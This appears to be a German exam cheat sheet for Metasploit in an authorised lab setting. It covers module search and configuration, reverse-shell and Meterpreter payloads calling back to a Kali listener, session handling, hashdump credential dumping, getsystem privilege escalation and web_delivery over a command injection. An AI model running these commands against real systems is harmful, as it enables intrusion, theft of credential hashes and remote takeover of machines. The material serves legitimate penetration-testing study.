# 🧨 Metasploit — Prüfungsanleitung

> Nur in der autorisierten Prüfungs-/Laborumgebung verwenden. Metasploit ersetzt nicht die Enumeration: **Produkt, Version, Ziel-OS und Architektur zuerst bestimmen.**

## 1. Der komplette Ablauf in Kurzform

```text
Nmap/Enumeration
→ passendes Modul suchen
→ Modulbeschreibung lesen
→ Pflichtoptionen setzen
→ Target und Payload passend zu OS/Architektur wählen
→ LHOST/LPORT setzen
→ check (falls unterstützt)
→ run/exploit
→ Session öffnen
→ user.txt sichern
→ PrivEsc weiter enumerieren
```

> **Hinweis Prof:** Ein Exploit kann für mehrere Betriebssysteme funktionieren, aber einen unpassenden Standard-Payload wählen. Deshalb immer `show targets` und `show payloads` prüfen.

---

## 2. Metasploit starten und verlassen

```bash
msfconsole -q
```

`-q` blendet das Banner aus und startet schneller/übersichtlicher.

```text
exit
```

### Nützliche globale Variablen

```text
setg RHOSTS <TARGET-IP>
setg LHOST <KALI-VPN-IP>
setg LPORT 4444
getg
```

- `setg` setzt einen Wert global für weitere Module.
- `set` gilt nur für das aktuell geladene Modul.
- Für `LHOST` die Kali-IP verwenden, die das Ziel erreichen kann, meist `tun0`.

Werte entfernen:

```text
unset RHOSTS
unsetg RHOSTS
unset all
```

---

## 3. Ein passendes Modul suchen

### Nach Produkt oder CVE

```text
search <PRODUKTNAME>
search <VERSION>
search cve:<JAHR-NUMMER>
```

Beispiele:

```text
search rejetto
search cve:2014-6287
search type:exploit platform:windows http
search type:auxiliary smb
```

Wichtige Modultypen:

| Typ | Zweck |
|---|---|
| `exploit` | Schwachstelle ausnutzen und oft eine Session erzeugen |
| `auxiliary` | Scannen, enumerieren oder testen; meist ohne Payload |
| `post` | Aktionen über eine bereits bestehende Session |
| `payload` | Code/Shell, der nach erfolgreicher Ausnutzung ausgeführt wird |

### Modul vor Benutzung lesen

```text
info <MODULPFAD>
use <NUMMER-AUS-DER-SUCHE>
# oder
use exploit/<PFAD>
info
```

Bei `info` besonders prüfen:

```text
□ betroffene Produktversion
□ Zielbetriebssystem
□ benötigte Authentifizierung
□ erwarteter Port/Pfad
□ Referenzen und Hinweise des Autors
□ ob ein Neustart/Crash möglich ist
```

Zurück zur Hauptkonsole:

```text
back
```

---

## 4. Modul richtig konfigurieren

Nach `use ...`:

```text
show options
```

Typische Optionen:

| Option | Was eintragen? |
|---|---|
| `RHOSTS` | Ziel-IP |
| `RPORT` | Zielport, z. B. `80`, `445`, `8080` |
| `TARGETURI` | Webpfad, z. B. `/`, `/weblog/`, `/app/` |
| `USERNAME` / `PASSWORD` | bekannte Zugangsdaten |
| `LHOST` | erreichbare Kali-/VPN-IP |
| `LPORT` | freier Listener-Port |
| `SSL` | `true`, falls der Dienst HTTPS verwendet |
| `VHOST` | virtueller Hostname, falls die App einen Host-Header benötigt |

Beispiel:

```text
set RHOSTS 10.10.10.10
set RPORT 8080
set TARGETURI /app/
set LHOST 10.8.0.5
set LPORT 4444
show options
```

> Werte mit Leerzeichen oder Sonderzeichen in Anführungszeichen setzen:
>
> ```text
> set PASSWORD 'Pass wort!123'
> ```

### Zielvariante wählen

```text
show targets
set TARGET <NUMMER>
```

`TARGET` beschreibt häufig Betriebssystem, Architektur oder Ausnutzungsweg. Nicht blind den Standard übernehmen.

### Payload wählen

```text
show payloads
set payload <PASSENDER-PAYLOAD>
```

Prüfungsrelevante Beispiele:

```text
# Windows x64, staged Meterpreter
set payload windows/x64/meterpreter/reverse_tcp

# Windows x64, stageless Meterpreter
set payload windows/x64/meterpreter_reverse_tcp

# Windows x64, normale Reverse Shell
set payload windows/x64/shell_reverse_tcp

# Linux x64 Meterpreter
set payload linux/x64/meterpreter/reverse_tcp

# Linux x64 normale Reverse Shell
set payload linux/x64/shell_reverse_tcp
```

Merke:

```text
windows/...  ≠ linux/...
x64          ≠ x86
meterpreter  ≠ normale Command Shell
```

---

## 5. Exploit testen und ausführen

Falls das Modul es unterstützt:

```text
check
```

- `check` versucht zu prüfen, ob das Ziel wahrscheinlich verwundbar ist.
- `check` ist nicht bei jedem Modul vorhanden und ein negatives/unklares Ergebnis ist nicht immer endgültig.

Ausführen:

```text
run
# oder bei Exploit-Modulen
exploit
```

Als Hintergrund-Job starten:

```text
run -j
# oder
exploit -j
```

Jobs anzeigen/beenden:

```text
jobs -l
jobs -k <JOB-ID>
```

### Generische Vorlage zum Kopieren

```text
search <PRODUKT/CVE>
use <MODUL>
info
show options
set RHOSTS <TARGET-IP>
set RPORT <PORT>
set TARGETURI <PFAD>
show targets
set TARGET <NUMMER>
show payloads
set payload <OS>/<ARCH>/<PAYLOAD>
set LHOST <KALI-VPN-IP>
set LPORT 4444
show options
check
run
```

---

## 6. Sessions verwalten

Alle Sessions anzeigen:

```text
sessions -l
```

Session öffnen:

```text
sessions -i <SESSION-ID>
```

Session in den Hintergrund legen:

```text
background
```

In einer normalen Shell funktioniert oft auch:

```text
Ctrl+Z
```

Dann die Rückfrage mit `y` bestätigen.

Session beenden:

```text
sessions -k <SESSION-ID>
sessions -K
```

`sessions -K` beendet **alle** Sessions – in der Prüfung vorsichtig verwenden.

---

## 7. Meterpreter-Grundbefehle

Nach erfolgreicher Meterpreter-Verbindung:

```text
sysinfo          # Betriebssystem und Architektur
getuid           # aktueller Benutzer
getprivs         # vorhandene Windows-Privilegien
pwd              # aktueller Ordner
ls               # Dateien auflisten
cd <PFAD>        # Ordner wechseln
cat <DATEI>      # Textdatei anzeigen
```

Dateien übertragen:

```text
download <REMOTE-DATEI> <LOKALER-PFAD>
upload <LOKALE-DATEI> <REMOTE-PFAD>
```

Normale System-Shell öffnen:

```text
shell
```

Von der System-Shell zurück zu Meterpreter:

```text
exit
```

Meterpreter in den Hintergrund:

```text
background
```

### Windows-Hashes

```text
hashdump
```

- Funktioniert nur mit ausreichenden Rechten, typischerweise Administrator/SYSTEM.
- Die Ausgabe enthält lokale NTLM-Hashes aus der SAM und **keinen NetNTLMv2-Challenge-Response**.
- Lokale NTLM-Hashes können je nach Dienst per Pass-the-Hash verwendbar sein; NetNTLMv2 muss normalerweise geknackt werden.

Optionaler Versuch bei passenden Windows-Rechten:

```text
getsystem
```

`getsystem` ist kein garantierter PrivEsc. Danach immer verifizieren:

```text
getuid
```

> **Prüfungsregel:** Sobald erhöhte Rechte vorhanden sind, zuerst `root.txt` beziehungsweise `C:\Users\Administrator\Desktop\root.txt` lesen und Beweis sichern.

---

## 8. Listener für einen msfvenom-Payload (`multi/handler`)

Wenn du den Payload separat mit `msfvenom` erzeugt hast, startet das Exploit-Modul keinen passenden Listener automatisch. Dann:

```bash
msfconsole -q
```

```text
use exploit/multi/handler
set payload <EXAKT-DERSELBE-PAYLOAD-WIE-BEI-MSFVENOM>
set LHOST <KALI-VPN-IP>
set LPORT 4444
set ExitOnSession false
show options
run -j
```

Beispiel für einen stageless Windows-x64-Meterpreter:

```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST 10.8.0.5
set LPORT 4444
set ExitOnSession false
run -j
```

Wichtig:

```text
msfvenom: windows/x64/meterpreter_reverse_tcp
handler:   windows/x64/meterpreter_reverse_tcp
           ^ muss exakt übereinstimmen
```

Details und Payload-Erzeugung: [msfvenom](./msfvenom.md)

---

## 9. Metasploit bei einer Web-Command-Injection (`web_delivery`)

Nützlich, wenn du bereits Befehle über eine Webanwendung ausführen kannst und darüber eine Meterpreter-Session erzeugen willst.

```text
use exploit/multi/script/web_delivery
show targets
set TARGET <PASSENDES-ZIEL, z. B. PowerShell für Windows>
show payloads
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <KALI-VPN-IP>
set LPORT 4444
run
```

Metasploit zeigt anschließend einen auszuführenden Befehl an. Diesen nur verwenden, wenn:

```text
□ das Target zum Betriebssystem passt
□ die Payload-Architektur stimmt
□ der Zielhost deine LHOST/LPORT erreichen kann
□ die Webanwendung Befehle tatsächlich ausführt
```

Zuerst die Command Injection mit einem harmlosen Befehl bestätigen:

```text
whoami
hostname
```

Erst danach den von Metasploit erzeugten Befehl einsetzen.

---

## 10. Auxiliary-Module verwenden

Auxiliary-Module dienen meist der Enumeration oder Prüfung und benötigen normalerweise keinen Payload.

```text
search type:auxiliary <DIENST>
use auxiliary/<PFAD>
show options
set RHOSTS <TARGET-IP>
set RPORT <PORT>
run
```

Beispielhafte Einsatzarten:

```text
SMB-Version/Informationen
HTTP-Scanner
Login-Prüfungen
Service-Enumeration
```

Ergebnisse immer mit deinen manuellen Recon-Ergebnissen vergleichen.

---

## 11. Häufige Fehler in der Prüfung

### `Exploit completed, but no session was created`

Prüfen:

```text
□ Ist die Version wirklich verwundbar?
□ Ist RPORT/TARGETURI/VHOST korrekt?
□ Stimmt TARGET mit OS und Architektur überein?
□ Stimmt der Payload mit Windows/Linux und x64/x86 überein?
□ Ist LHOST die vom Ziel erreichbare VPN-IP?
□ Ist LPORT frei und nicht durch Firewall blockiert?
□ Kann das Ziel zu Kali zurückverbinden?
□ Wurde die Payload von Defender/AV entfernt?
□ Braucht der Exploit gültige Credentials?
```

### Falscher Standard-Payload

```text
show targets
show payloads
set TARGET <PASSEND>
set payload <PASSEND>
```

### Web-Exploit findet die Anwendung nicht

```text
set RPORT <RICHTIGER-PORT>
set TARGETURI /richtiger/pfad/
set SSL true
set VHOST app.example.local
```

### Mehr Ausgabe für Fehlersuche

```text
set VERBOSE true
show advanced
```

> **Hinweis Prof:** Ein Error bedeutet nicht automatisch, dass der Exploit falsch ist. Fehlermeldung lesen und Version, Python/Ruby-Abhängigkeiten, Kompilierung, Payload, Pfad und Zielsystem prüfen.

---

## 12. Prüfungs-Schnellreferenz

| Ziel | Befehl |
|---|---|
| Modul suchen | `search <NAME/CVE>` |
| Modul laden | `use <NUMMER/PFAD>` |
| Beschreibung | `info` |
| Pflichtwerte | `show options` |
| Zielvarianten | `show targets` |
| Payloads | `show payloads` |
| Wert setzen | `set <OPTION> <WERT>` |
| Verwundbarkeit prüfen | `check` |
| Starten | `run` / `exploit` |
| Hintergrund-Job | `run -j` |
| Jobs | `jobs -l` |
| Sessions | `sessions -l` |
| Session öffnen | `sessions -i <ID>` |
| Session parken | `background` |
| Session beenden | `sessions -k <ID>` |
| Modul verlassen | `back` |

## Minimaler Merksatz

```text
SEARCH → INFO → USE → OPTIONS → TARGET → PAYLOAD → LHOST/LPORT → CHECK → RUN → SESSIONS
```
